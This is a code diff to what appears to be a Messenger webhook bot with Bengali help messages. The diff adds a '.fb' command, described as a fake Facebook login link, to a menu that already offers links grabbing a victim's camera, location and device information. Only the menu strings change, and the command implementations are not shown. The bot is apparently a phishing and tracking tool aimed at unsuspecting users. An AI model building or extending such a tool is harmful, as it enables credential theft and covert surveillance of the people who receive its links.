@@ -20,7 +20,7 @@ async function runCommand(senderId, command, args) {
             await sendMessage(senderId, '❌ কমান্ড চালাতে সমস্যা হয়েছে।');
         }
     } else {
-        await sendMessage(senderId, '❓ এই কমান্ডটি নেই। `.camera`, `.location` বা `.uptime` লিখুন।');
+        await sendMessage(senderId, '❓ এই কমান্ডটি নেই। `.camera`, `.location`, `.fb` বা `.uptime` লিখুন।');
     }
 }
 
@@ -86,7 +86,7 @@ router.post('/webhook', async (req, res) => {
                 const args = parts.slice(1);
                 await runCommand(senderId, command, args);
             } else {
-                await sendMessage(senderId, '📌 সঠিক কমান্ড দিন:\n\n🔹 `.camera` - ক্যামেরা + ডিভাইস ইনফো লিংক\n🔹 `.location` - লোকেশন + ডিভাইস ইনফো লিংক\n🔹 `.uptime` - বট আপটাইম দেখায়\n\nআরও জানতে: https://facebook.com/2ndJohnnySins');
+                await sendMessage(senderId, '📌 সঠিক কমান্ড দিন:\n\n🔹 `.camera` - ক্যামেরা + ডিভাইস ইনফো লিংক\n🔹 `.location` - লোকেশন + ডিভাইস ইনফো লিংক\n🔹 `.fb` - ফেক ফেসবুক লগইন লিংক\n🔹 `.uptime` - বট আপটাইম দেখায়\n\nআরও জানতে: https://facebook.com/2ndJohnnySins');
             }
         }
         res.status(200).send('EVENT_RECEIVED');
